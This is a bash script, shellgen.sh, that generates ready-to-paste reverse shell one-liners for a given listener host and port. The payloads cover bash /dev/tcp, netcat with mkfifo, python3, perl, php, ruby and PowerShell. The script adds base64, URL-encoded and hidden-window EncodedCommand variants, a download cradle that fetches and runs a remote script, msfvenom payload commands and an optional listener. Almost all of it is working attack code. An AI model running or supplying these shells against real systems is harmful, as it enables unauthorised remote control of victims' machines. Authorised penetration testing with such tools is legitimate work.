#!/usr/bin/env bash
#
# shellgen.sh - multi-format reverse / bind shell generator
# -----------------------------------------------------------------------------
# Prints ready-to-paste reverse shells for a given LHOST/LPORT in every common
# flavour, plus encodings you actually need in the field:
#   - bash, sh, nc (traditional + mkfifo), python3, perl, php, ruby, powershell
#   - base64 + URL-encoded variants of the bash one-liner
#   - a PowerShell download-cradle and an msfvenom suggestion
# Optionally starts a matching listener in the same run (-L).
# -----------------------------------------------------------------------------
# AUTHORIZED USE ONLY: for callbacks from systems you are permitted to test.
# -----------------------------------------------------------------------------
#
# USAGE:
#   ./shellgen.sh -l <LHOST> -p <LPORT> [-t <type>] [-L]
#
#   -t  filter to one type (bash|nc|python|perl|php|ruby|powershell|all)  default all
#   -L  after printing, start a listener (pwncat-cs > rlwrap nc > nc) on LPORT
#
# EXAMPLES:
#   ./shellgen.sh -l 10.10.14.3 -p 443
#   ./shellgen.sh -l 10.10.14.3 -p 9001 -t powershell -L
#
# DEPENDENCIES: none to generate. Listener uses pwncat-cs / rlwrap / nc if present.
# -----------------------------------------------------------------------------

set -euo pipefail
c_info(){ printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_ok(){   printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_hdr(){  printf '\n\033[1;36m# %s\033[0m\n' "$*"; }
have(){ command -v "$1" >/dev/null 2>&1; }

LHOST="" LPORT="" TYPE="all" LISTEN=""
usage(){ sed -n '2,28p' "$0"; exit 1; }
while getopts "l:p:t:Lh" o; do case "$o" in
  l) LHOST=$OPTARG;; p) LPORT=$OPTARG;; t) TYPE=$OPTARG;; L) LISTEN=1;; *) usage;;
esac; done
[ -z "$LHOST" ] || [ -z "$LPORT" ] && { usage; }

show(){ [ "$TYPE" = all ] || [ "$TYPE" = "$1" ]; }

c_info "Reverse shells for ${LHOST}:${LPORT}"

if show bash; then c_hdr "bash"
  BASH="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
  echo "$BASH"
  echo "bash -c '$BASH'"
  c_hdr "bash (base64)"
  B64=$(printf '%s' "$BASH" | base64 -w0)
  echo "echo $B64 | base64 -d | bash"
  c_hdr "bash (URL-encoded one-liner)"
  printf '%s' "bash -c '$BASH'" | python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read()))' 2>/dev/null || echo "(install python3 for urlencode)"
fi
if show nc; then c_hdr "nc"
  echo "nc -e /bin/sh $LHOST $LPORT"
  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"
fi
if show python; then c_hdr "python3"
  echo "python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect((\"$LHOST\",$LPORT));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
fi
if show perl; then c_hdr "perl"
  echo "perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
fi
if show php; then c_hdr "php"
  echo "php -r '\$s=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
fi
if show ruby; then c_hdr "ruby"
  echo "ruby -rsocket -e'f=TCPSocket.open(\"$LHOST\",$LPORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
fi
if show powershell; then c_hdr "powershell (reverse)"
  PS='$c=New-Object System.Net.Sockets.TCPClient("'"$LHOST"'",'"$LPORT"');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()'
  echo "powershell -nop -W hidden -c \"$PS\""
  c_hdr "powershell (base64 -EncodedCommand)"
  echo "powershell -nop -W hidden -EncodedCommand $(printf '%s' "$PS" | iconv -t UTF-16LE 2>/dev/null | base64 -w0 || echo '<need iconv>')"
  c_hdr "powershell download-cradle"
  echo "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/rev.ps1')\""
fi

c_hdr "msfvenom (binary payloads -> see payload-forge.sh for evasion)"
echo "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe"
echo "msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf"

if [ -n "$LISTEN" ]; then
  c_hdr "Listener on :$LPORT"
  if have pwncat-cs; then c_ok "pwncat-cs (upgraded shell)"; exec pwncat-cs -l -p "$LPORT"
  elif have rlwrap && have nc; then c_ok "rlwrap nc"; exec rlwrap nc -lvnp "$LPORT"
  elif have nc; then c_ok "nc"; exec nc -lvnp "$LPORT"
  else c_info "No nc/pwncat found - start your own listener on $LPORT"; fi
fi
